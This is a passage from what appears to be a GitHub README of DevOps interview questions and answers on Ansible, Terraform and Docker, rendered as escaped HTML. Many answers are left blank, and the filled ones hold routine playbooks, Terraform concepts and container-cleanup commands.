&lt;summary&gt;You want to run Ansible playbook only on specific minor version of your OS, how would you achieve that?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What would be the result of the following play?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;---
- name: Print information about my host
  hosts: localhost
  gather_facts: 'no'                                                                                                                                                                           
  tasks:
      - name: Print hostname
        debug:
            msg: "It's me, {{ ansible_hostname }}"
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;When given a written code, always inspect it thoroughly. If your answer is “this will fail” then you are right. We are using a fact (ansible_hostname), which is a gathered piece of information from the host we are running on. But in this case, we disabled facts gathering (gather_facts: no) so the variable would be undefined which will result in failure.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What would be the result of running the following task?
&lt;pre&gt;&lt;code&gt;- hosts: localhost
  tasks:
      - name: Install zlib
        package:
          name: zlib
          state: present
&lt;/code&gt;&lt;/pre&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Which Ansible best practices are you familiar with?. Name at least three&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain the directory layout of an Ansible role&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Write a playbook to install ‘zlib’ and ‘vim’ on all hosts if the file ‘/tmp/mario’ exists on the system.&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;---
- hosts: all
  vars:
      mario_file: /tmp/mario
      package_list:
          - 'zlib' 
          - 'vim'
  tasks:
      - name: Check for mario file
        stat:
            path: "{{ mario_file }}"
        register: mario_f

      - name: Install zlib and vim if mario file exists
        become: "yes"
        package:
            name: "{{ item }}"
            state: present
        with_items: "{{ package_list }}"
        when: mario_f.stat.exists
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Write a playbook to deploy the file ‘/tmp/system_info’ on all hosts except for controllers group, with the following content&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;I'm &amp;lt;HOSTNAME&amp;gt; and my operating system is &amp;lt;OS&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Replace  and   with the actual data for the specific host you are running on&lt;/p&gt;
&lt;p&gt;The playbook to deploy the system_info file&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;--- 
- name: Deploy /tmp/system_info file
  hosts: all:!controllers
  tasks: 
      - name: Deploy /tmp/system_info
        template:
            src: system_info.j2 
            dest: /tmp/system_info
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The content of the system_info.j2 template&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# {{ ansible_managed }}
I'm {{ ansible_hostname }} and my operating system is {{ ansible_distribution }
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;The variable 'whoami' defined in the following places:
&lt;ul&gt;
&lt;li&gt;role defaults -&amp;gt; whoami: mario&lt;/li&gt;
&lt;li&gt;extra vars (variables you pass to Ansible CLI with -e) -&amp;gt; whoami: toad&lt;/li&gt;
&lt;li&gt;host facts -&amp;gt; whoami: luigi&lt;/li&gt;
&lt;li&gt;inventory variables (doesn’t matter which type) -&amp;gt; whoami: browser&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;According to variable precedence, which one will be used?&lt;/p&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;The right answer is ‘toad’.&lt;/p&gt;
&lt;p&gt;Variable precedence is about how variables override each other when they set in different locations. If you didn’t experience it so far I’m sure at some point you will, which makes it a useful topic to be aware of.&lt;/p&gt;
&lt;p&gt;In the context of our question, the order will be extra vars (always override any other variable) -&amp;gt; host facts -&amp;gt; inventory variables -&amp;gt; role defaults (the weakest).&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A full list can be found at the link above. Also, note there is a significant difference between Ansible 1.x and 2.x.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;For each of the following statements determine if it's true or false:
&lt;ul&gt;
&lt;li&gt;A module is a collection of tasks&lt;/li&gt;
&lt;li&gt;It’s better to use shell or command instead of a specific module&lt;/li&gt;
&lt;li&gt;Host facts override play variables&lt;/li&gt;
&lt;li&gt;A role might include the following: vars, meta, and handlers&lt;/li&gt;
&lt;li&gt;Dynamic inventory is generated by extracting information from external sources&lt;/li&gt;
&lt;li&gt;It’s a best practice to use indention of 2 spaces instead of 4&lt;/li&gt;
&lt;li&gt;‘notify’ used to trigger handlers&lt;/li&gt;
&lt;li&gt;This “hosts: all:!controllers” means ‘run only on controllers group hosts&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is ansible-pull? How is it different from how ansible-playbook works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Ansible Vault?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Demonstrate each of the following with Ansible:
&lt;ul&gt;
&lt;li&gt;Conditionals&lt;/li&gt;
&lt;li&gt;Loops&lt;/li&gt;
&lt;/ul&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;p&gt;&lt;a name="user-content-ansible-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advanced-4" class="anchor" aria-hidden="true" href="#star-advanced-4"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What are filters? Do you have experience with writing filters?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Write a filter to capitalize a string&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;code&gt;
def cap(self, string):
    return string.capitalize()
&lt;/code&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You would like to run a task only if previous task changed anything. How would you achieve that?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you test your Ansible based projects?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are callback plugins? What can you achieve by using callback plugins?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;File '/tmp/exercise' includes the following content
&lt;pre&gt;&lt;code&gt;Goku = 9001
Vegeta = 5200
Trunks = 6000
Gotenks = 32
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With one task, switch the content to:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Goku = 9001
Vegeta = 250
Trunks = 40
Gotenks = 32
&lt;/code&gt;&lt;/pre&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;- name: Change saiyans levels
  lineinfile:
    dest: /tmp/exercise
    regexp: "{{ item.regexp }}"
    line: "{{ item.line }}"
  with_items:
    - { regexp: '^Vegeta', line: 'Vegeta = 250' }
    - { regexp: '^Trunks', line: 'Trunks = 40' }
    ...
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-terraform" class="anchor" aria-hidden="true" href="#terraform"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Terraform&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-terraform-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-9" class="anchor" aria-hidden="true" href="#baby-beginner-9"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Can you explain what is Terraform? How it works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Read &lt;a href="https://www.terraform.io/intro/index.html#what-is-terraform-" rel="nofollow"&gt;here&lt;/a&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What benefits infrastructure-as-code has?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;fully automated process of provisioning, modifying and deleting your infrastructure&lt;/li&gt;
&lt;li&gt;version control for your infrastructure which allows you to quickly rollback to previous versions&lt;/li&gt;
&lt;li&gt;validate infrastructure quality and stability with automated tests and code reviews&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;makes infrastructure tasks less repetitive
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Why Terraform and not other technologies? (e.g. Ansible, Puppet, CloufFormation)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;A common &lt;em&gt;wrong&lt;/em&gt; answer is to say that Ansible and Puppet are configuration management tools
and Terraform is a provisioning tool. While technically true, it doesn't mean Ansible and Puppet can't
be used for provisioning infrastructure. Also, it doesn't explain why Terraform should be used over
CloudFormation if at all.&lt;/p&gt;
&lt;p&gt;The benefits of Terraform over the other tools:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;It follows the immutable infrastructure approach which has benefits like avoiding a configuration drift over time&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Ansible and Puppet are more procedural (you mention what to execute in each step) and Terraform is declarative since you describe the overall desired state and not per resource or task. You can give the example of going from 1 to 2 servers in each tool. In Terraform you specify 2, in Ansible and puppet you have to only provision 1 additional server so you need to explicitly make sure you provision only another one server.
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain what is "Terraform configuration"&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
A configuration is a root module along with a tree of child modules that are called as dependencies from the root module.
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is HCL?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
HCL stands for Hashicorp Conviguration Language. It is the language Hashicorp made to use as the configuration language for a number of its tools, including terraform.
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain each of the following:
&lt;ul&gt;
&lt;li&gt;Provider&lt;/li&gt;
&lt;li&gt;Resource&lt;/li&gt;
&lt;li&gt;Provisioner&lt;/li&gt;
&lt;/ul&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
  * Provider is any cloud based technology - github, aws, postgresql etc - which one can make an API call to with its unique terraform provider binary to provision available services and components.&lt;br&gt;  
  * Resources are the services and components you provision on these platforms.&lt;br&gt;
  * Provisioner in terraform's lingo specifically refers to configuration tools like ansible or salt-stack which are used in combination with terraform to orchestrate a system.
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What &lt;code&gt;terraform.tfstate&lt;/code&gt; file is used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt; 
&lt;/b&gt;&lt;p&gt;&lt;b&gt;It keeps track of the IDs of created resources so that Terraform knows what it is managing.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain what the following commands do:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;terraform init&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;terraform plan&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;terraform validate&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;terraform apply&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;code&gt;terraform init&lt;/code&gt; scans your code to figure which providers are you using and download them.
&lt;code&gt;terraform plan&lt;/code&gt; will let you see what terraform is about to do before actually doing it.
&lt;code&gt;terraform validate&lt;/code&gt; checks if configuration is syntactically valid and internally consistent within a directory.
&lt;code&gt;terraform apply&lt;/code&gt; will provision the resources specified in the .tf files.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to write down a variable which changes by an external source or during &lt;code&gt;terraform apply&lt;/code&gt;?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You use it this way: &lt;code&gt;variable “my_var” {}&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Give an example of several Terraform best practices&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain how implicit and explicit dependencies work in Terraform&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is &lt;code&gt;local-exec&lt;/code&gt; and &lt;code&gt;remote-exec&lt;/code&gt; in the context of provisioners?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a "tainted resource"?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;It's a resource which was successfully created but failed during provisioning. Terraform will fail and mark this resource as "tainted".
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What &lt;code&gt;terraform taint&lt;/code&gt; does?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What types of variables are supported in Terraform?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;string
number
bool
list()
set()
map()
object({&amp;lt;ATTR_NAME&amp;gt; = , ... })
tuple([, ...])
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is a data source? In what scenarios for example would need to use it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
Data sources lookup or compute values that can be used elsewhere in terraform configuration.
&lt;p&gt;There are quite a few cases you might need to use them:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;you want to reference resources not managed through terraform&lt;/li&gt;
&lt;li&gt;you want to reference resources managed by a different terraform module&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;you want to cleanly compute a value with typechecking, such as with &lt;code&gt;aws_iam_policy_document&lt;/code&gt;
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What are output variables and what &lt;code&gt;terraform output&lt;/code&gt; does?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
Output variables are named values that are sourced from the attributes of a module. They are stored in terraform state, and can be used by other modules through &lt;code&gt;remote_state&lt;/code&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Modules&lt;/summary&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the Terraform Registry?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain &lt;code&gt;remote-exec&lt;/code&gt; and &lt;code&gt;local-exec&lt;/code&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;p&gt;&lt;a name="user-content-terraform-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advanced-5" class="anchor" aria-hidden="true" href="#star-advanced-5"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain "Remote State". When would you use it and how?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
  Terraform generates a `terraform.tfstate` json file that describes components/service provisioned on the specified provider. Remote  
  State stores this file in a remote storage media to enable collaboration amongst team.
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain "State Locking"&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
  State locking is a mechanism that blocks an operations against a specific state file from multiple callers so as to avoid conflicting operations from different team members. Once the first caller's operation's lock is released the other team member may go ahead to   
  carryout his own operation. Nevertheless Terraform will first check the state file to see if the desired resource already exist and 
  if not it goes ahead to create it.
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the "Random" provider? What is it used for&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
 The random provider aids in generating numeric or alphabetic characters to use as a prefix or suffix for a desired named identifier.
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you test a terraform module?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
  Many examples are acceptable, but the most common answer would likely to be using the tool &lt;code&gt;terratest&lt;/code&gt;, and to test that a module can be initialized, can create resources, and can destroy those resources cleanly.
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Aside from &lt;code&gt;.tfvars&lt;/code&gt; files or CLI arguments, how can you inject dependencies from other modules?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
  The built-in terraform way would be to use &lt;code&gt;remote-state&lt;/code&gt; to lookup the outputs from other modules.
  It is also common in the community to use a tool called &lt;code&gt;terragrunt&lt;/code&gt; to explicitly inject variables between modules.
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-docker" class="anchor" aria-hidden="true" href="#docker"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Docker&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-docker-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-10" class="anchor" aria-hidden="true" href="#baby-beginner-10"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is Docker? What are you using it for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings.
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How containers are different from VMs?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;The primary difference between containers and VMs is that containers allow you to virtualize
multiple workloads on the operating system while in the case of VMs the hardware is being virtualized to
run multiple machines each with its own OS.&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Containers don't require an entire guest operating system as VMs&lt;/li&gt;
&lt;li&gt;It's usually takes a few seconds to set up a container as opposed to VMs which can take minutes or at least more time than containers as there is an entire OS to boot and initialize as opposed to container where you mainly lunch the app itself&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Docker is one of the technologies allowing you to manage containers - run multiple containers on a host, move containers between hosts, etc.
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;In which scenarios would you use containers and in which you would prefer to use VMs?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;You should choose VMs when:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;you need run an application which requires all the resources and functionalities of an OS&lt;/li&gt;
&lt;li&gt;you need full isolation and security&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You should choose containers when:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;you need a lightweight solution&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Running multiple versions or instances of a single application
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain Docker architecture&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Describe in detail what happens when you run `docker run hello-world`?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Docker CLI passes your request to Docker daemon.
Docker daemon downloads the image from Docker Hub
Docker daemon creates a new container by using the image it downloaded
Docker daemon redirects output from container to Docker CLI which redirects it to the standard output
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How do you run a container?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;docker run
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What `docker commit` does?. When will you use it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Create a new image from a container’s changes
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How would you transfer data from one container into another?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What happens to data of the container when a container exists?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what each of the following commands do:
&lt;ul&gt;
&lt;li&gt;docker run&lt;/li&gt;
&lt;li&gt;docker rm&lt;/li&gt;
&lt;li&gt;docker ps&lt;/li&gt;
&lt;li&gt;docker pull&lt;/li&gt;
&lt;li&gt;docker build&lt;/li&gt;
&lt;li&gt;docker commit&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;How do you remove old, non running, containers?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ol&gt;&lt;b&gt;
&lt;li&gt;To remove one or more Docker images use the docker container rm command followed by the ID of the containers you want to remove.&lt;/li&gt;
&lt;li&gt;The docker system prune command will remove all stopped containers, all dangling images, and all unused networks&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;docker rm $(docker ps -a -q) - This command will delete all stopped containers. The command docker ps -a -q will return all existing container IDs and pass them to the rm command which will delete them. Any running containers will not be deleted.
&lt;/b&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/details&gt;

